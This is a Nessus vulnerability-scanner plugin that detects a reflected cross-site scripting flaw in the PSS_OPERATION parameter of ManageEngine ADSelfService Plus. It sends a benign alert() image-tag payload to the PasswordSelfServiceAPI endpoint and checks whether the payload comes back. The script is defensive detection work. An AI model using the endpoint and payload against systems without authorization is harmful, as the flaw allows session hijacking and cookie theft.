#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(91989);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/11/28 21:39:21 $");

  script_osvdb_id(137797);

  script_name(english:"ManageEngine ADSelfService Plus < 5.3 Build 5313 PasswordSelfServiceAPI XSS");
  script_summary(english:"Attempts to exploit a cross-site scripting vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host is affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The ManageEngine ADSelfService Plus application running on the remote
host is affected by a cross-site scripting (XSS) vulnerability in
PasswordSelfServiceAPI due to improper sanitization of user-supplied
input to the 'PSS_OPERATION' parameter. An unauthenticated, remote
attacker can exploit this, via a specially crafted URL, to execute
arbitrary scripting code in the user's browser session. An attacker
can also exploit this issue to disclose cookie-based authentication
credentials.");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ManageEngine ADSelfService Plus version 5.3 build 5313 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"see_also", value:"https://dl.packetstormsecurity.net/1606-exploits/messp-xss.txt");
  # https://forums.manageengine.com/topic/adselfservice-plus-5-3-build-5313
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0716ffec");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/05/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/05/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/07/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zohocorp:manageengine_adselfservice_plus");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("manageengine_adselfservice_detect.nasl");
  script_require_keys("installed_sw/ManageEngine ADSelfService Plus");
  script_require_ports("Services/www", 8888);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

port    = get_http_port(default:8888);

install = get_single_install(
  app_name : 'ManageEngine ADSelfService Plus',
  port    : port
);

unqstr = SCRIPT_NAME - ".nasl" + "-" + unixtime();
dir = install['path'];
cgi = '/RestAPI/PasswordSelfServiceAPI';
qs  = 'operation=verifyUser&PRODUCT_NAME=ADSSP&PSS_OPERATION=';
xss = '<img src=x onerror=alert(\'' + unqstr +'\');>';

exploited = test_cgi_xss(
  port     : port,
  dirs     : make_list(dir,""),
  cgi      : cgi,
  qs       : qs+urlencode(str:xss),
  pass_str : '"OPERATION":"'+xss+'"',
  ctrl_re  : "OPERATION"
);
if (!exploited)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "ManageEngine ADSelfService Plus", build_url(qs:dir+cgi, port:port));
